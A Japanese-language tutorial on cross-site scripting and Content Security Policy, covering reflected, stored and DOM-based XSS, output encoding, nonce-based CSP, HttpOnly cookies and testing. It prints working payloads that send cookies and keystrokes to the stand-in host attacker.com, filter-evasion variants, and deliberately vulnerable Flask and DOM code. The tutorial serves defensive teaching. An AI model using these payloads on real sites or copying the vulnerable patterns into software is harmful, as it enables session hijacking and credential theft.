---
title: XSS（クロスサイトスクリプティング）・CSP
category: "概念"
emoji: "📜"
order: 1002
date: "2026-04-09"
series: [Webアプリセキュリティ]
tags: ["セキュリティ", "Webアプリ", "XSS", "CSP", "DOM", "JavaScript"]
source: "The Web Application Hacker's Handbook（Stuttard & Pinto, 2011）/ OWASP XSS Prevention Cheat Sheet / OWASP DOM Based XSS Prevention Cheat Sheet / MDN Web Docs CSP / PortSwigger Web Security Academy"
---

## XSS とは

**攻撃者が用意した JavaScript をターゲットのユーザーのブラウザで実行させる攻撃。**

Same-Origin Policy の観点では、被害者のブラウザ上で実行されるスクリプトは  
**正規サイトのオリジンを持つ**ため、そのサイトのすべての情報にアクセスできる。

```
攻撃者が実現できること:
  ・セッション Cookie の窃取 → アカウント乗っ取り
  ・キーストロークの記録（パスワード・クレジットカード番号）
  ・偽のログインフォームの表示（フィッシング）
  ・ユーザーの代わりにリクエストを送信（CSRF と同様の効果）
  ・マルウェアのダウンロードへの誘導
  ・WebRTC を使ったカメラ・マイクへのアクセス
```

---

## XSS の3種類

### Reflected XSS（反射型）

**悪意あるスクリプトをリクエストに埋め込み、レスポンスにそのまま反射させる。**  
攻撃 URL を被害者にクリックさせる必要がある。

```
攻撃フロー:
  1. 攻撃者が細工した URL を被害者に送る
     https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

  2. 被害者がクリック → サーバーが入力をそのままレスポンスに含める
     <h2>検索結果: <script>document.location='https://...'</script></h2>

  3. ブラウザがスクリプトを実行 → Cookie が攻撃者のサーバーに送信される
```

```python
# 脆弱なコード（Flask）
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<h2>検索結果: {query}</h2>"  # ← query が HTML として解釈される
```

### Stored XSS（格納型）

**悪意あるスクリプトを DB に保存させ、他ユーザーが閲覧した際に実行させる。**  
攻撃者が1回仕込むだけで、閲覧した全ユーザーが被害を受ける。最も影響が大きい。

```
攻撃フロー:
  1. 攻撃者がコメント欄などに XSS ペイロードを投稿・保存
     コメント: <script>new Image().src='https://attacker.com/?c='+document.cookie</script>

  2. 他のユーザーがページを閲覧するたびにスクリプトが実行される

  3. 全閲覧ユーザーの Cookie が継続的に窃取される
```

SNS・掲示板・レビューサイト・管理画面（ユーザー入力を閲覧する）が主な対象。

### DOM-based XSS（DOM型）

**サーバーは関与せず、クライアント側の JavaScript が DOM を操作する際に発生する。**  
サーバーのレスポンスには悪意あるコードが含まれないため、サーバー側の対策だけでは防げない。

```javascript
// 脆弱なコード
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `こんにちは、${name}！`;
//                                  ↑ innerHTML は HTML として解釈される

// 攻撃 URL:
// https://example.com/?name=<img src=x onerror=alert(document.cookie)>
// → ブラウザ内だけで XSS が成立する（サーバーに攻撃ペイロードが届かない）
```

**Source と Sink の概念:**

```
Source（汚染されたデータの入り口）:
  location.search / location.hash / document.referrer
  document.cookie / localStorage / IndexedDB
  postMessage / WebSocket データ

Sink（危険な操作）:
  innerHTML / outerHTML / document.write      ← HTML として解釈
  eval() / setTimeout(string) / Function()    ← JS として評価
  location.href / location.assign            ← javascript: URL
  element.src / element.action               ← URL として解釈
```

---

## XSS ペイロードのバリエーション

```html
<!-- 基本 -->
<script>alert(1)</script>

<!-- イベントハンドラ（フィルタ回避） -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- javascript: スキーマ -->
<a href="javascript:alert(1)">click</a>

<!-- エンコーディングによるフィルタ回避 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- 大文字・小文字混在 -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Cookie 窃取 -->
<script>new Image().src='https://attacker.com/c?'+document.cookie</script>

<!-- キーロガー -->
<script>
document.addEventListener('keyup', e => {
  fetch('https://attacker.com/log', {method:'POST', body: e.key});
});
</script>
```

---

## 対策1: 出力エンコード（最重要）

**HTML に出力する際に必ずエスケープする。**  
ユーザー入力が HTML として解釈されないようにする。

```python
# Python: markupsafe（Jinja2 が自動で使用）
from markupsafe import escape
safe = escape("<script>alert(1)</script>")
# → &lt;script&gt;alert(1)&lt;/script&gt;

# Jinja2 テンプレートでは {{ variable }} が自動エスケープされる
# 意図的に HTML を許可する場合だけ {{ variable | safe }} を使う（危険）
```

```javascript
// JavaScript: textContent を使う（innerHTML は使わない）
// 危険
element.innerHTML = userInput;

// 安全: textContent はテキストノードとして挿入（HTML 解釈なし）
element.textContent = userInput;

// DOM 操作で要素を作る場合
const p = document.createElement('p');
p.textContent = userInput;  // 安全
container.appendChild(p);
```

```javascript
// React は JSX で自動エスケープ
// 危険: dangerouslySetInnerHTML を使う場合
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// 安全: 通常の JSX
<div>{userInput}</div>
```

### コンテキスト別のエンコード

```html
<!-- HTML 本文: HTML エンティティエスケープ -->
<p>ようこそ、&lt;b&gt;Alice&lt;/b&gt;さん</p>

<!-- HTML 属性値: 引用符を含むエスケープ（必ず引用符で囲む）-->
<input value="&lt;script&gt;alert(1)&lt;/script&gt;">

<!-- JavaScript 内: JSON エンコード or Unicode エスケープ -->
<script>
  const name = "{{ name | tojson }}";  // Jinja2: JSON エンコード
</script>

<!-- URL: パーセントエンコード -->
<a href="/search?q={{ query | urlencode }}">検索</a>
```

---

## 対策2: Content Security Policy（CSP）

**ブラウザに「どのリソースを実行・読み込んでよいか」を指示するHTTPヘッダー。**  
XSS が発生しても、インラインスクリプトや外部スクリプトの実行をブロックできる。

### 基本的な CSP ヘッダー

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'self'
```

| ディレクティブ | 意味 |
|---|---|
| `default-src 'self'` | デフォルトで同一オリジンのみ許可 |
| `script-src 'self'` | スクリプトは同一オリジンのみ |
| `style-src 'self'` | スタイルは同一オリジンのみ |
| `img-src 'self' data:` | 画像は同一オリジンと data URI |
| `object-src 'none'` | Flash・プラグインを完全禁止 |
| `base-uri 'self'` | `<base>` タグを同一オリジンに限定 |
| `frame-ancestors 'none'` | iframe での埋め込みを禁止（Clickjacking 対策）|

### Nonce を使った CSP（実践的）

`'unsafe-inline'` を許可せずインラインスクリプトを使う方法。

```python
# Flask: リクエストごとにランダムな nonce を生成
import secrets

@app.before_request
def set_csp_nonce():
    g.csp_nonce = secrets.token_urlsafe(16)

@app.after_request
def add_csp_header(response):
    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{g.csp_nonce}'; "
        f"object-src 'none'"
    )
    return response
```

```html
<!-- テンプレート: nonce をスクリプトタグに付与 -->
<script nonce="{{ g.csp_nonce }}">
  // このスクリプトだけ実行が許可される
  const data = {{ user_data | tojson }};
</script>
```

### CSP のよくある落とし穴

```
❌ 'unsafe-inline': インラインスクリプトを許可 → XSS を直接許可するのと同じ
❌ 'unsafe-eval': eval() を許可 → 動的コード実行を許可してしまう
❌ ワイルドカード: script-src * → 任意の外部スクリプトを許可
❌ data: を script-src に: data:text/javascript,alert(1) で実行可能
❌ JSONP エンドポイントのドメインを許可: そのドメイン経由で任意 JS を実行可能
```

### CSP のレポート機能

```
# 違反時にレポートを送信するだけ（ブロックしない）
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

# ブロック + レポート送信
Content-Security-Policy: default-src 'self'; report-uri /csp-report
```

導入初期は `Report-Only` で違反を収集してから `enforce` モードに移行する。

---

## 対策3: HttpOnly Cookie

```python
# Flask: HttpOnly + Secure + SameSite を設定
response.set_cookie(
    'session',
    value=session_token,
    httponly=True,    # JavaScript から Cookie にアクセス不可
    secure=True,      # HTTPS のみで送信
    samesite='Strict' # クロスサイトリクエストでは Cookie を送らない
)
```

`HttpOnly` を設定すると `document.cookie` でアクセスできなくなり、  
XSS が成功しても Cookie 窃取を防げる。（**XSS 自体の防止ではない**ことに注意）

---

## XSS のテスト手法

### 基本的な確認ポイント

```
テストすべき入力箇所:
  ・URL クエリパラメータ
  ・フォームの各フィールド
  ・HTTP ヘッダー（User-Agent・Referer・X-Forwarded-For）
  ・Cookie 値
  ・ファイルアップロードのファイル名・SVG ファイルの内容
  ・JSON/XML のフィールド
```

### Burp Suite を使ったテスト

```
1. Burp Proxy でリクエストをインターセプト
2. スキャナーで自動 XSS 検出
3. Repeater で手動ペイロードを試す
4. DOM Invader（拡張機能）で DOM XSS の Source/Sink を自動追跡
```

### DOM XSS の手動確認

```javascript
// ブラウザのコンソールで Source を確認
console.log(location.search);
console.log(location.hash);
console.log(document.referrer);

// 危険な Sink を grep で探す
grep -rn "innerHTML\|outerHTML\|document.write\|eval(" src/
grep -rn "dangerouslySetInnerHTML" src/  # React
```

---

## チェックリスト

```
□ テンプレートエンジンの自動エスケープを有効にしている
□ innerHTML / document.write を使わず textContent / createElement を使っている
□ React の dangerouslySetInnerHTML を使う箇所を最小化・レビューしている
□ CSP ヘッダーを設定し 'unsafe-inline' を避けている
□ CSP の nonce を毎リクエストでランダムに生成している
□ Cookie に HttpOnly・Secure・SameSite を設定している
□ URL パラメータをそのままレスポンスに含めていない
□ JSON API レスポンスに Content-Type: application/json を設定している
□ SVG ファイルのアップロードを制限している（SVG は JavaScript を含められる）
□ Burp Suite / OWASP ZAP で定期的に XSS スキャンをしている
```

---

## 参考文献

- Dafydd Stuttard & Marcus Pinto『The Web Application Hacker's Handbook』（Wiley, 2011）— XSS の3種類と高度な攻撃手法を体系的に解説
- OWASP XSS Prevention Cheat Sheet — コンテキスト別エンコードの実装ガイド（owasp.org）
- OWASP DOM Based XSS Prevention Cheat Sheet — Source・Sink の概念と安全な DOM 操作パターン
- MDN Web Docs『Content Security Policy（CSP）』— CSP ディレクティブの仕様と nonce の使い方
- PortSwigger Web Security Academy『Cross-site scripting』— 実際に手を動かして学べる無料 XSS ラボ
